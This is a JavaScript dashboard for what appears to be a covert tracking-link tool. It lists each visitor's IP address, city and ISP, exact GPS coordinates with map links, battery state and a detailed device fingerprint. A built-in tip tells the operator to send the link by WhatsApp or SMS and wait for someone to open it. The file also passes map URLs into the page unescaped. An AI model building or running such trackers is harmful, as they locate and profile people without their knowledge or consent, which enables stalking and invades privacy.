function showToast(message) {
  const toast = document.getElementById('toast');
  toast.textContent = message;
  toast.classList.remove('hidden');
  setTimeout(() => toast.classList.add('hidden'), 2500);
}

function escapeHtml(str) {
  if (str == null) return '—';
  const div = document.createElement('div');
  div.textContent = String(str);
  return div.innerHTML;
}

function formatValue(val) {
  if (val == null || val === '') return '—';
  if (typeof val === 'boolean') return val ? 'Yes' : 'No';
  if (typeof val === 'object') return JSON.stringify(val);
  return String(val);
}

function getLinkId() {
  const parts = window.location.pathname.split('/');
  return parts[parts.length - 1];
}

function deviceIcon(deviceType) {
  if (deviceType === 'Mobile') return '📱';
  if (deviceType === 'Tablet') return '📲';
  return '💻';
}

function renderVisit(visit, index) {
  const fields = [
    ['Device type', visit.deviceType],
    ['OS', visit.os],
    ['Browser', visit.browser],
    ['Phone / Model', visit.model],
    ['Platform', visit.platform],
    ['IP address', visit.ip],
    ['GPU Graphics', visit.gpu],
    ['Language', visit.language],
    ['Timezone', visit.timezone],
    ['Screen', visit.screenWidth && visit.screenHeight ? `${visit.screenWidth} × ${visit.screenHeight}` : null],
    ['Viewport', visit.viewportWidth && visit.viewportHeight ? `${visit.viewportWidth} × ${visit.viewportHeight}` : null],
    ['Pixel ratio', visit.pixelRatio],
    ['Orientation', visit.orientation],
    ['Touch support', visit.touchSupport],
    ['Touch points', visit.maxTouchPoints],
    ['Online', visit.online],
    ['CPU cores', visit.hardwareConcurrency],
    ['RAM (GB)', visit.deviceMemory],
    ['Color depth', visit.colorDepth ? `${visit.colorDepth}-bit` : null],
    ['Cookies', visit.cookiesEnabled],
    ['Referrer', visit.referrer],
  ];

  if (visit.battery) {
    fields.push(['Battery', visit.battery.level]);
    fields.push(['Charging', visit.battery.charging]);
  }

  if (visit.connection) {
    fields.push(['Connection', visit.connection.type]);
    if (visit.connection.downlink) fields.push(['Downlink', visit.connection.downlink]);
    if (visit.connection.rtt) fields.push(['RTT', visit.connection.rtt]);
  }

  if (visit.ipGeo) {
    fields.push(['Country', `${visit.ipGeo.country} (${visit.ipGeo.countryCode})`]);
    fields.push(['City / Region', `${visit.ipGeo.city}, ${visit.ipGeo.region}`]);
    fields.push(['ISP / Network', visit.ipGeo.isp || visit.ipGeo.org]);
    if (visit.ipGeo.lat && visit.ipGeo.lon) {
      fields.push(['IP Location Map', `<a href="${visit.ipGeo.mapsUrl}" target="_blank" style="color: var(--accent); font-weight: 600;">📍 Open Map (${visit.ipGeo.lat}, ${visit.ipGeo.lon})</a>`]);
    }
  }

  if (visit.gpsLocation) {
    fields.push(['Exact GPS Coordinates', `${visit.gpsLocation.latitude}, ${visit.gpsLocation.longitude}`]);
    fields.push(['GPS Accuracy', visit.gpsLocation.accuracy]);
    fields.push(['Exact GPS Map', `<a href="${visit.gpsLocation.mapsUrl}" target="_blank" style="color: #22c55e; font-weight: 700;">🎯 Open Exact GPS Map</a>`]);
  }

  const grid = fields
    .filter(([, v]) => v != null && v !== '')
    .map(([label, value]) => `
      <div class="info-item">
        <div class="label">${escapeHtml(label)}</div>
        <div class="value">${typeof value === 'string' && value.includes('<a href=') ? value : escapeHtml(formatValue(value))}</div>
      </div>
    `).join('');

  return `
    <div class="visit-card">
      <div class="visit-header">
        <div>
          <span class="device-badge">${deviceIcon(visit.deviceType)} ${escapeHtml(visit.deviceType || 'Unknown')}</span>
          <h3>Visit #${index + 1}</h3>
        </div>
        <span class="visit-time">${new Date(visit.timestamp).toLocaleString()}</span>
      </div>
      <div class="info-grid">${grid}</div>
    </div>
  `;
}

async function loadDashboard() {
  const linkId = getLinkId();
  const container = document.getElementById('visitsContainer');

  try {
    const res = await fetch(`/api/links/${linkId}`);
    if (!res.ok) throw new Error('Not found');

    const link = await res.json();

    document.getElementById('dashTitle').textContent = link.label;
    document.getElementById('dashMeta').textContent =
      `Created ${new Date(link.createdAt).toLocaleString()} · ${link.visits.length} visit${link.visits.length !== 1 ? 's' : ''}`;

    document.getElementById('shareUrl').value = `${window.location.origin}/t/${linkId}`;

    if (link.visits.length === 0) {
      container.innerHTML = `
        <p class="empty-state">
          No visits yet. Share your link and wait for someone to open it.<br><br>
          <strong>Tip:</strong> Send the link via WhatsApp, SMS, or any messenger.
        </p>
      `;
      return;
    }

    container.innerHTML = link.visits.map((v, i) => renderVisit(v, i)).join('');
  } catch {
    container.innerHTML = '<p class="empty-state">Link not found.</p>';
  }
}

document.getElementById('copyShareBtn').addEventListener('click', async () => {
  await navigator.clipboard.writeText(document.getElementById('shareUrl').value);
  showToast('Link copied!');
});

document.getElementById('refreshDash').addEventListener('click', loadDashboard);

loadDashboard();
setInterval(loadDashboard, 10000);
